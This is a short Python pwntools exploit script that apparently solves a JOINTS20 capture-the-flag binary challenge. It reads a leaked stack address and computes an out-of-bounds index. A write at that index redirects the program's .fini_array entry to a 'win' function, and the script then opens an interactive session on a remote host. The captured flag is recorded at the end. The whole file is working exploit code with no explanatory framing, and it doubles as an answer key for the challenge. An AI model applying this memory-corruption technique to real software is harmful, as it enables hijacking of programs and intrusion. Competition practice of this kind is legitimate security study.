from pwn import *
import sys
HOST = '104.199.120.115'
PORT = 17075
BINARY = './ez'


def exploit(p):
    #addr
    fini_array = 0x4031c8
    fini = 0x401324
    win = 0x401172
    offset = fini-win
    #get leak
    leak = p.recvline().strip().split(' ')[5]
    leak = int(leak, 16)

    #calculation
    # v3 = [rbp-68h], v4 = [rbp-60h]
    # so v4 = v3(leak) + 0x8 
    v4_addr = leak + 0x8
    jarak = (fini_array - v4_addr)/8
    p.recvuntil('>')
    p.sendline(str(jarak))
    p.recvuntil('>')
    p.sendline(str(0x72))
    p.interactive()

if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r)
    else:
        # local
        p = process(BINARY)
        exploit(p)

#FLAG : JOINTS20{K3t1K4_pR0b53T_m46eR}